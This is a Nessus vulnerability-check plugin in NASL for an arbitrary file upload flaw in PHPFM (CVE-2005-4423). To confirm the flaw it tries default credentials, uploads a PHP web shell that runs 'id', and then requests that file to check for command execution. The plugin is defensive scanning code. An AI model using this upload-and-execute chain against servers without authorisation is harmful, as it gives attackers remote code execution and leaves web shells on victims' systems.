#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20169);
  script_version("$Revision: 1.19 $");

  script_cve_id("CVE-2005-4423");
  script_bugtraq_id(15335);
  script_osvdb_id(22799);

  script_name(english:"PHPFM Arbitrary File Upload");
  script_summary(english:"Checks for arbitrary file upload vulnerability in PHPFM");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to an
arbitrary file upload vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running PHPFM, a web-based file manager
written in PHP. 

The version of PHPFM installed on the remote host allows anyone to
upload arbitrary files and then to execute them subject to the
privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/415986/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Set 'AllowUpload' to false in 'conf/config.inc.php' or restrict access
to trusted users." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/11/08");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/11/06");
 script_cvs_date("$Date: 2015/09/24 23:21:19 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:phpfm:phpfm");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/phpfm", "/files", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Make sure it's PHPFM.
  r = http_send_recv3(method:"GET", item:string(dir, "/index.php?&&path=&action=upload"), port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it is...
  if ("<title>PHPFM" >< res) {
    # Upload a file that runs a system command.
    file = string(rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789"), ".php");
    bound = SCRIPT_NAME;
    boundary = string("--", bound);

    # If we're asked to authenticate, use the default username / password.
    if ("input name='input_username'" >< res) {
      postdata = string(
        boundary, "\r\n",
        'Content-Disposition: form-data; name="input_username"', "\r\n",
        "\r\n",
        "username\r\n",

        boundary, "\r\n",
        'Content-Disposition: form-data; name="input_password"', "\r\n",
        "\r\n",
        "password\r\n"
      );
    }
    else postdata = "";

    postdata = string(
      postdata,

      boundary, "\r\n",
      'Content-Disposition: form-data; name="path"', "\r\n",
      "\r\n",
      "\r\n",

      boundary, "\r\n",
      'Content-Disposition: form-data; name="submit"', "\r\n",
      "\r\n",
      "Upload\r\n",

      boundary, "\r\n",
      'Content-Disposition: form-data; name="userfile[]"; filename="', file, '"', "\r\n",
      "Content-Type: text/plain\r\n",
      "\r\n",
      # nb: try to run 'id'.
      "<?php system(id); ?>\r\n",

      boundary, "--", "\r\n"
    );
    req = string(
      req,
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );

    r = http_send_recv3(method: "POST", port: port,
      item: dir + "/?&&output=upload&upload=true",
      content_type: "multipart/form-data; boundary=" + bound,
      data: postdata);
    if (isnull(r)) exit(0);
    res = r[2];

    # Now try to run the command.
    r = http_send_recv3(method:"GET", item:string(dir, "/", file), port:port);
    if (isnull(r)) exit(0);
    res = r[2];

    # There's a problem if...
    if (
      # the output looks like it's from id or...
      egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res) ||
      # PHP's disable_functions prevents running system().
      egrep(pattern:"Warning.+\(\) has been disabled for security reasons", string:res)
    ) {
      if (report_verbosity > 0) {
        report = string(
          "\n",
          "Nessus was able to execute the command 'id' on the remote host to\n",
          "produce the output :\n",
          "\n",
          res
        );
        security_warning(port:port, extra:report);
      }
      else security_warning(port);

      exit(0);
    }
  }
}
